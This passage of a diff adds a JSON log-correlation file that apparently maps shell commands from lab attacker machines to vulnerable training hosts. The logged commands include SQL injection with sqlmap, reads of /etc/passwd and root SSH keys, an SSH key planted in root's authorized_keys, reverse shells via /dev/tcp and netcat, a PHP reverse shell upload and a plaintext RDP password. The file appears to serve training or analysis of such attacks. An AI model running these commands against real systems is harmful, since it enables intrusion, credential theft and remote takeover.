+          "matches": [
+            "git",
+            "cron"
+          ]
+        },
+        {
+          "file": "boxes/forge/deploy/deploy.sh",
+          "matches": [
+            "git",
+            "cron"
+          ]
+        },
+        {
+          "file": "boxes/forge/deploy/nginx-git.conf",
+          "matches": [
+            "git"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-01-27T19:00:00",
+      "target_ip": "10.100.7.46",
+      "target_box": "ember",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 632,
+          "command": "smbclient //10.100.7.46/Scripts --user guest",
+          "timestamp": "2026-01-27T19:00:36"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 633,
+          "command": "nxc smb 10.100.7.46 -u guest -p ''",
+          "timestamp": "2026-01-27T19:00:45"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 307,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:00:08"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 308,
+          "command": "xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:00:52"
+        },
+        {
+          "log_file": "logs/10.100.7.22/shell_history.csv",
+          "line": 181,
+          "command": "nxc smb [10.100.7.46] -u guest -p",
+          "timestamp": "2026-01-27T19:00:46"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 252,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:00:33"
+        },
+        {
+          "log_file": "logs/10.100.7.24/shell_history.csv",
+          "line": 253,
+          "command": "xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!",
+          "timestamp": "2026-01-27T19:00:58"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/ember/documentation.md",
+          "matches": [
+            "phpinfo",
+            "anonymous",
+            "maintenance.ps1",
+            "SMB"
+          ]
+        },
+        {
+          "file": "boxes/ember/deploy/deploy.ps1",
+          "matches": [
+            "git",
+            "anonymous",
+            "phpinfo",
+            "SMB",
+            "maintenance.ps1"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-02T18:48:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 771,
+          "command": "curl http://10.100.7.45/panels.php?id=%22test%22",
+          "timestamp": "2026-02-02T18:48:33"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 772,
+          "command": "curl http://10.100.7.45/panels.php?id=test\"\"",
+          "timestamp": "2026-02-02T18:48:38"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 773,
+          "command": "curl http://10.100.7.45/panels.php?id=%22test%22",
+          "timestamp": "2026-02-02T18:48:43"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 404,
+          "command": "nmap -sV -p 1-65535 -T3 10.100.7.45",
+          "timestamp": "2026-02-02T18:48:37"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-02T19:22:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 786,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\"\"",
+          "timestamp": "2026-02-02T19:22:58"
+        },
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 293,
+          "command": "gobuster dir -u http://10.100.7.45 -w /usr/share/wordlists/dirb/common.txt",
+          "timestamp": "2026-02-02T19:22:08"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-02T19:28:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 805,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\"\"",
+          "timestamp": "2026-02-02T19:28:40"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 408,
+          "command": "sqlmap -u http://10.100.7.45\" --dbs\"",
+          "timestamp": "2026-02-02T19:28:21"
+        },
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 296,
+          "command": "curl http://10.100.7.45/index.php?id=1'\"\"",
+          "timestamp": "2026-02-02T19:28:45"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 166,
+          "command": "sqlmap -u 10.100.7.45/panels?id=1\" --file-read=/etc/passwd\"",
+          "timestamp": "2026-02-02T19:28:39"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 167,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --file-read=/etc/passwd\"",
+          "timestamp": "2026-02-02T19:28:47"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-02T19:31:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 806,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\"\"",
+          "timestamp": "2026-02-02T19:31:06"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 807,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --dbs\"",
+          "timestamp": "2026-02-02T19:31:21"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 808,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --dbs\"",
+          "timestamp": "2026-02-02T19:31:28"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 809,
+          "command": "cd ~/.local/share/sqlmap/output/10.100.7.45",
+          "timestamp": "2026-02-02T19:31:36"
+        },
+        {
+          "log_file": "logs/10.100.7.14/shell_history.csv",
+          "line": 413,
+          "command": "sqlmap -u http://10.100.7.45/index.php?id=1\" --dbs --crawl=2 --risk=3\"",
+          "timestamp": "2026-02-02T19:31:20"
+        },
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 297,
+          "command": "curl http://10.100.7.45/index.php?id=5\"\"",
+          "timestamp": "2026-02-02T19:31:03"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 170,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --file-read=/root/.ssh/id_rsa --hex\"",
+          "timestamp": "2026-02-02T19:31:37"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-02T19:34:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 815,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" -D \"pyrewatch\" --tables\"",
+          "timestamp": "2026-02-02T19:34:17"
+        },
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 299,
+          "command": "curl http://10.100.7.45/panels.php?id=abc\"\"",
+          "timestamp": "2026-02-02T19:34:57"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-02T19:37:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 820,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" -D \"information_schema\" -T \"FILES\" --dump --threads $(nproc)\"",
+          "timestamp": "2026-02-02T19:37:32"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 821,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" -D \"information_schema\" -T \"FILES\" --dump --threads $(nproc)\"",
+          "timestamp": "2026-02-02T19:37:35"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 824,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --dbs\"",
+          "timestamp": "2026-02-02T19:37:44"
+        },
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 301,
+          "command": "curl http://10.100.7.45/panels.php?id=5 AND 1=1\"\"",
+          "timestamp": "2026-02-02T19:37:17"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-02T19:38:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 827,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" -D \"pyrewatch\" --tables\"",
+          "timestamp": "2026-02-02T19:38:43"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 828,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" -D \"pyrewatch\" --tables --threads $(nproc)\"",
+          "timestamp": "2026-02-02T19:38:52"
+        },
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 302,
+          "command": "curl http://10.100.7.45/panels.php?id=5%20AND%201=1\"\"",
+          "timestamp": "2026-02-02T19:38:25"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-02T19:39:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 829,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" -D \"pyrewatch\" -T \"alerts\" --threads $(nproc)\"",
+          "timestamp": "2026-02-02T19:39:07"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 174,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --file-read=/etc/ssh/sshd_config --threads 10\"",
+          "timestamp": "2026-02-02T19:39:53"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-02T19:48:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 851,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\"\"",
+          "timestamp": "2026-02-02T19:48:36"
+        },
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 319,
+          "command": "curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%204--%20-\"\"",
+          "timestamp": "2026-02-02T19:48:13"
+        },
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 320,
+          "command": "curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%208--%20-\"\"",
+          "timestamp": "2026-02-02T19:48:28"
+        },
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 321,
+          "command": "curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%2010--%20-\"\"",
+          "timestamp": "2026-02-02T19:48:41"
+        },
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 322,
+          "command": "curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%2030--%20-\"\"",
+          "timestamp": "2026-02-02T19:48:51"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-02T19:50:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 858,
+          "command": "sqlmap -u http://10.100.7.45/alerts.php?severity=&status=\"\"",
+          "timestamp": "2026-02-02T19:50:33"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 859,
+          "command": "sqlmap -u http://10.100.7.45/alerts.php?severity=&status=\"\"",
+          "timestamp": "2026-02-02T19:50:44"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 200,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --file-write=./id_rsa --file-dest=/root/.ssh/id_rsa\"",
+          "timestamp": "2026-02-02T19:50:33"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 201,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --file-write=./rsa_id --file-dest=/root/.ssh/rsa_id\"",
+          "timestamp": "2026-02-02T19:50:43"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-02T19:52:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 862,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --batch -D\"",
+          "timestamp": "2026-02-02T19:52:48"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 863,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --batch\"",
+          "timestamp": "2026-02-02T19:52:52"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 864,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=\" --batch\"",
+          "timestamp": "2026-02-02T19:52:59"
+        },
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 327,
+          "command": "curl http://10.100.7.45/panels.php?id=5%20AND%201=2\"\"",
+          "timestamp": "2026-02-02T19:52:02"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 206,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --file-read=/root/.ssh/\"",
+          "timestamp": "2026-02-02T19:52:27"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-02T19:54:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 870,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --users --passwords\"",
+          "timestamp": "2026-02-02T19:54:22"
+        },
+        {
+          "log_file": "logs/10.100.7.13/shell_history.csv",
+          "line": 328,
+          "command": "curl http://10.100.7.45/panels.php?id=5%20AND%20database()%20IS%20NOT%20NULL\"\"",
+          "timestamp": "2026-02-02T19:54:53"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 209,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --file-write=id_rsa --file-dest=/root/.ssh/id_rsa\"",
+          "timestamp": "2026-02-02T19:54:21"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-03T18:45:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 886,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --file-read=/etc/ssh/sshd_config --threads=$(nproc)\"",
+          "timestamp": "2026-02-03T18:45:07"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 887,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --file-read=/etc/ssh/sshd_config --threads=$(nproc)\"",
+          "timestamp": "2026-02-03T18:45:07"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 888,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --file-read=/etc/ssh/sshd_config --threads=$(nproc)\"",
+          "timestamp": "2026-02-03T18:45:07"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 889,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --file-read=/etc/ssh/sshd_config --threads=$(nproc)\"",
+          "timestamp": "2026-02-03T18:45:07"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 217,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --file-write=\"script.sh\" --file-dest=\"/tmp/script.sh\"\"",
+          "timestamp": "2026-02-03T18:45:35"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-03T18:47:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 893,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --file-write=/home/kali/.ssh/helios_ssh_key.pub --file-dest=/root/.ssh/authorized_keys\"",
+          "timestamp": "2026-02-03T18:47:16"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 894,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --file-write=/home/kali/.ssh/helios_ssh_key.pub --file-dest=/root/.ssh/authorized_keys\"",
+          "timestamp": "2026-02-03T18:47:33"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 219,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --file-read=\"/tmp/script.sh\"\"",
+          "timestamp": "2026-02-03T18:47:16"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-03T18:53:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 905,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --file-write=./ctrl.txt --file-dest=/home/pyre/ctrl.txt\"",
+          "timestamp": "2026-02-03T18:53:45"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 222,
+          "command": "sqlmap -u 10.100.7.45\" --os-cmd=\"whoami\"\"",
+          "timestamp": "2026-02-03T18:53:30"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 223,
+          "command": "sqlmap -u 10.100.7.45\" -p id --os-cmd=\"whoami\"\"",
+          "timestamp": "2026-02-03T18:53:50"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-03T18:54:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 906,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --os-cmd=whoami\"",
+          "timestamp": "2026-02-03T18:54:56"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 224,
+          "command": "sqlmap -u 10.100.7.45.panels.php?id=1\" --os-cmd=\"whoami\"\"",
+          "timestamp": "2026-02-03T18:54:06"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 225,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --os-cmd=\"whoami\"\"",
+          "timestamp": "2026-02-03T18:54:20"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-03T18:55:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 907,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --os-cmd=ls\"",
+          "timestamp": "2026-02-03T18:55:28"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 908,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --os-cmd=\"ls ../\"\"",
+          "timestamp": "2026-02-03T18:55:46"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 909,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --os-cmd=\"ls ../../\"\"",
+          "timestamp": "2026-02-03T18:55:54"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 226,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --os-cmd=\"sudo useradd mason\"\"",
+          "timestamp": "2026-02-03T18:55:29"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-03T19:01:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 926,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --os-cmd=\"bash -i >& /dev/tcp/10.100.7.32/4444 0>&1\"\"",
+          "timestamp": "2026-02-03T19:01:09"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 927,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --os-cmd=\"nc 10.100.7.32 4444 -e /bin/bash\"\"",
+          "timestamp": "2026-02-03T19:01:31"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 928,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --os-cmd=\"sh -i >& /dev/tcp/10.100.7.32/4444 0>&1\"\"",
+          "timestamp": "2026-02-03T19:01:57"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 228,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --os-shell\"",
+          "timestamp": "2026-02-03T19:01:58"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-03T19:12:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 934,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --os-shell\"",
+          "timestamp": "2026-02-03T19:12:44"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 233,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --file-read=\"/ctrl.txt\"\"",
+          "timestamp": "2026-02-03T19:12:03"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 234,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --file-read=\"home/pyre/ctrl.txt\"\"",
+          "timestamp": "2026-02-03T19:12:50"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-03T19:31:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 952,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --write-file=./php-reverse-shell.php --dest-file=/var/www/html/rev-shell.php\"",
+          "timestamp": "2026-02-03T19:31:12"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 953,
+          "command": "sqlmap -u http://10.100.7.45/panels.php?id=1\" --file-write=./php-reverse-shell.php --file-dest=/var/www/html/rev-shell.php\"",
+          "timestamp": "2026-02-03T19:31:47"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 253,
+          "command": "sqlmap -u 10.100.7.45/panels.php?id=1\" --os-shell\"",
+          "timestamp": "2026-02-03T19:31:54"
+        },
+        {
+          "log_file": "logs/10.100.7.31/shell_history.csv",
+          "line": 79,
+          "command": "gobuster dir -u http://10.100.7.45 -w directory-list-2.3-medium.txt",
+          "timestamp": "2026-02-03T19:31:20"
+        }
+      ],
+      "matched_vuln_notes": [
+        {
+          "file": "boxes/pyre/documentation.md",
+          "matches": [
+            "sql",
+            "git",
+            "sql injection"
+          ]
+        },
+        {
+          "file": "boxes/pyre/deploy/deploy.sh",
+          "matches": [
+            "sql",
+            "sql injection",
+            "cron"
+          ]
+        }
+      ]
+    },
+    {
+      "time_window": "2026-02-03T19:43:00",
+      "target_ip": "10.100.7.45",
+      "target_box": "pyre",
+      "entries": [
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 960,
+          "command": "ssh pyre@10.100.7.45",
+          "timestamp": "2026-02-03T19:43:04"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 961,
+          "command": "ssh pyre@10.100.7.45",
+          "timestamp": "2026-02-03T19:43:37"
+        },
+        {
+          "log_file": "logs/10.100.7.32/shell_history.csv",
+          "line": 962,
+          "command": "ssh pyre@10.100.7.45",
+          "timestamp": "2026-02-03T19:43:57"
+        },
+        {
+          "log_file": "logs/10.100.7.12/shell_history.csv",
+          "line": 267,
